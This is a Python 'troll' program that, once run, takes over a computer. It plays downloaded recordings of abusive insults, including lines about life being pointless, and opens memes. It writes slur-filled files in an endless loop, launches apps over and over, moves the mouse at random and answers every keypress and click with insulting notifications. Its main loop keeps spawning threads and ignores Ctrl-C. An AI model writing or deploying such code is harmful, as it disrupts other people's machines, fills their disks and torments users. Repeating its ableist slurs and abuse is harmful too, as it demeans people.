#!/bin/env python3

import os
import time
import platform

import random
import urllib.request

from pynput.mouse import Listener
from pynput import keyboard
from Xlib import X, display

from threading import *
import string

import requests
import sys

from PIL import Image
from playsound import playsound
from win10toast import ToastNotifier

import webbrowser
import subprocess

## Screaming Part

# Generate time

def generateTime(end_number = 150,min_number = 50,max_number = 300):
    # This basically just generates 2 random numbers that add up to the same thing

    first_number = random.randint(end_number-min_number,end_number)
    second_number = random.randint(min_number,end_number-min_number)

    while True:
        if first_number+second_number == max_number:
            break
        else:
            sum = first_number + second_number
            ammount_left = max_number - sum
            ammount_left = ammount_left // 2

            print(f"sum: {sum}")
            print(f"ammount left: {ammount_left}")

            second_number = second_number + ammount_left
            first_number = first_number + ammount_left + 1
            print(str(first_number) + " " + str(second_number))
            continue
    return [first_number, second_number]

# Download Shit

def download():
    try:
        os.mkdir('Audio')
    except FileExistsError:
        pass

    files = os.listdir()

    downloadName = ['Audio/startAudio.mp3']

    combo = {
    'Audio/startAudio.mp3':'https://glados.c-net.org/files/GLaDOS-29941.wav',
    }

    if not downloadName in files:
        for i,x in combo.items():
            print(i)
            print(x)
            urllib.request.urlretrieve(x,i)
            playsound(i)
    else:
        pass


def screaming():
    numbers = generateTime()

    download()

    files = os.listdir()

    combos={
    'Audio/advanced_cunt.mp3':"http://cache-a.oddcast.com/tts/gen.php?EID=3&LID=1&VID=3&TXT=what%20a%20stupid%20cunt.%20fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.fuck%20you.%20bitch.&IS_UTF8=1&EXT=mp3&FNAME=&ACC=5883747&API=&SESSION=&CS=e1f4c6faca5d6a6cc2f4a16a02ba7864&cache_flag=3",
    'Audio/cunt.mp3':"http://cache-a.oddcast.com/tts/gen.php?EID=3&LID=1&VID=3&TXT=what%20a%20stupid%20cunt&IS_UTF8=1&EXT=mp3&FNAME=&ACC=5883747&API=&SESSION=&CS=50f9f344a9fb3a6195bc666b64eceaed&cache_flag=3",
    'Audio/dumbass.mp3':"http://cache-a.oddcast.com/tts/gen.php?EID=3&LID=1&VID=3&TXT=you%20have%20done%20nothing%20with%20your%20life%20do%20you%20really%20think%20that%20your%20work%20has%20effected%20anyone&IS_UTF8=1&EXT=mp3&FNAME=&ACC=5883747&API=&SESSION=&CS=5c3accd09ef49c86c4c91e814e6440a7&cache_flag=3",
    'Audio/dumbcunt.mp3':"http://cache-a.oddcast.com/tts/gen.php?EID=3&LID=1&VID=3&TXT=fuck%20you.%20you%20dumb%20cunt.&IS_UTF8=1&EXT=mp3&FNAME=&ACC=5883747&API=&SESSION=&CS=34428e303a5aa0f0dd04c4861dbdcaad&cache_flag=3",
    'Audio/life.mp3':"http://cache-a.oddcast.com/tts/gen.php?EID=3&LID=1&VID=3&TXT=does%20life%20matter%20that%20much.%20whats%20the%20point%20of%20life.%20man%20you%20are%20fucking%20retarded&IS_UTF8=1&EXT=mp3&FNAME=&ACC=5883747&API=&SESSION=&CS=251748ee675452c563680f3aaea8f9e3&cache_flag=3",
    'Audio/pickle.mp3':"http://cache-a.oddcast.com/tts/gen.php?EID=3&LID=1&VID=3&TXT=he%20turned%20himself%20into%20a%20pickle...%20funniest%20shit%20i%20have%20ever%20seen&IS_UTF8=1&EXT=mp3&FNAME=&ACC=5883747&API=&SESSION=&CS=34af653d48de3d865753028b45444b10&cache_flag=3",
    'Audio/hell.mp3':"http://cache-a.oddcast.com/tts/gen.php?EID=3&LID=1&VID=3&TXT=alright%20so%20i%20just%20reserved%20a%20place%20for%20you%20in%20hell.%20where%20you%20belong&IS_UTF8=1&EXT=mp3&FNAME=&ACC=5883747&API=&SESSION=&CS=956f2fba77e1c833f99552c640fafc48&cache_flag=3"}

    for i,x in combos.items():
        print(i)
        print(x)
        urllib.request.urlretrieve(x,i)
        time.sleep(random.choice(numbers))
        playsound(i)


## Download memes


def memes():
    meme_list = ["https://coalregioncanary.com/wp-content/uploads/2020/02/coronavirus-chinese-student-meme.jpg",
    "https://i1.wp.com/nintendosoup.com/wp-content/uploads/2020/04/the-coffin-dance-meme-is-recreated-in-mario-kart-wii-J9JlRLSGxjk.jpg?resize=1038%2C576&ssl=1",
    "https://ultramunch.com/wp-content/uploads/2020/01/1579853440151-min.png"] # MEMES, what the fuck am i doing with my life

    name = names_gen() #  Getting File name

    random_meme = random.choice(meme_list) # picking meme
    print(random_meme) # for testing 403 errors

    urllib.request.urlretrieve(random_meme, name)
    time.sleep(5)
    img = Image.open(name)
    img.show() # opening image


## Fuck With The PC [Part]


def names_gen(str_length=15): # this is supposed to be up but i cba moving
    list = os.listdir() # Checking Files In List
    print(list)
    DELIMETER = ''

    while True:
        random_shit = string.ascii_letters + string.digits + string.ascii_lowercase # string
        random_shit = DELIMETER.join((random.choice(random_shit) for i in range(str_length))) #Totally forgot what this does
        if not random_shit in list:
            break
        else:
            continue
    return random_shit # return


def file_writer():
    while True:
        random_shit = names_gen() # getting name
        time.sleep(1) # for threading break
        with open(random_shit, 'x+') as f: # this will just make the file and write to it, we can do this because we checked for duplicates in names_gen
            print(random_shit)
            f.write("Hehe You Are Retard "*500)
            time.sleep(10)
            webbrowser.open(random_shit)
            if platform.system() == "Windows":
                os.system("notepad.exe {}".format(random_shit))  # This is the last thing imma code
            elif platform.system() == "Linux":
                os.system(f"gedit {random_shit};kate {random_shit};sensible-editor {random_shit}") # i am going to explode


def random_open():
    print("Working")
    while True:
        time.sleep(.8)
        if platform.system() == 'Linux':
            apps = ['sensible-browser','discord','dolphin','nautilus','terminal','konsole','files','systemsettings5'] # random linux apps
            app_chosen = random.choice(apps)
            app_open = app_chosen
            os.system(app_open) # Running Command
        elif platform.system() == "Windows":
            subprocess.call("explorer C:\\temp\\", shell=True)
            apps = ['start excel.exe','start notepad.exe','start chrome.exe','start cmd','explorer','start explorer']
            os.system("start excel.exe")
            os.system("")
        continue # GOD FUCKING DAMN IT


# Mouse Section

def random_move(): # Moving Mouse
    while True:
        random_time = random.uniform(0,1.5)

        time.sleep(random_time)

        random_number = random.uniform(0,2)

        randx = random.randint(0,1920)
        randy = random.randint(0,1080)

        d = display.Display() # i don't fucking know what this does
        s = d.screen()
        root = s.root
        root.warp_pointer(int(randx * random_number),int(randy * random_number)) # Moving The Mouse
        d.sync() # god kill me

def on_move(x, y): # XY cordinates
    print(f'Mouse Moved {x} {y} ')
    print('Action Performed')
    if platform.system() == "Linux":
        notifiction = "notify-send 'Retard' 'Hehe Retard You Moved Your Mouse'"
        os.system(notifiction) # God kill me, This Just makes the command work
    elif platform.system() == "Windows":
        toaster = ToastNotifier()
        toaster.show_toast("Hehe Retard","I am a retard I am a retard I am a retard I am a retard",duration=5)


def on_click(x,y,button,pressed): # Buttons Pressed
    print(f'Button Click at {x} {y} with {button}')
    print('Action Performed')
    if platform.system() == "Linux":
        notifiction = "notify-send 'Retard' 'Hehe Retard You Clicked Your Mouse'"
        os.system(notifiction)
    elif platform.system() == "Windows":
        toaster = ToastNotifier()
        toaster.show_toast("Hehe Retard","I am a retard I am a retard I am a retard I am a retard",duration=5)


def on_scroll(x,y,dx,dy): # Scrolling cordinates
    print(f"Mouse Scrolled to [{dx} {dy}]")
    print('Action Performed')
    if platform.system() == "Linux":
        notifiction = "notify-send 'Retard' 'Hehe Retard You Scrolled'"
        os.system(notifiction)
    elif platform.system() == "Windows":
        toaster = ToastNotifier()
        toaster.show_toast("Hehe Retard","I am a retard I am a retard I am a retard I am a retard",duration=5)


# Keyboard Section


def on_press(key):
    print('Key {} pressed.'.format(key))
    if platform.system() == "Linux":
        notifiction = "notify-send 'Retard' 'Hehe Retard You Pressed A Button'"
        os.system(notifiction)
    elif platform.system() == "Windows":
        toaster = ToastNotifier()
        toaster.show_toast("Hehe Retard","I am a retard I am a retard I am a retard I am a retard",duration=5)


def on_release(key):
    print('Key {} released.'.format(key))
    if platform.system() == "Linux":
        notifiction = "notify-send 'Retard' 'Hehe Retard You Released A Button'"
        os.system(notifiction)
    elif platform.system() == "Windows":
        toaster = ToastNotifier()
        toaster.show_toast("Hehe Retard","I am a retard I am a retard I am a retard I am a retard",duration=5)


# Start Mouse Tracking
def start_mouse(on_move,on_click,on_scroll):
    with Listener(on_move=on_move, on_click=on_click,on_scroll=on_scroll) as listener:
        listener.join() # Starting

# Start Keyboard Logging
def start_keyboard(on_press,on_release):
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

threads = []

try:
    while True: # makes it work
        p1 = Thread(target=start_mouse, args=(on_move,on_click,on_scroll))
        p2 = Thread(target=start_keyboard, args=(on_press, on_release))
        p3 = Thread(target=random_move)
        p4 = Thread(target=random_open)
        p5 = Thread(target=file_writer)
        p6 = Thread(target=memes)
        p7 = Thread(target=screaming)

        p7.start()
        time.sleep(5)
        p1.start()
        time.sleep(20)
        p2.start()
        time.sleep(10)
        p3.start()
        time.sleep(5)
        p4.start()
        p5.start()
        p6.start()
        time.sleep(5)
        threads.append(p4)
        threads.append(p5)
        threads.append(p6)
    for thread in threads:
        thread.join()
except KeyboardInterrupt:
    print("No")
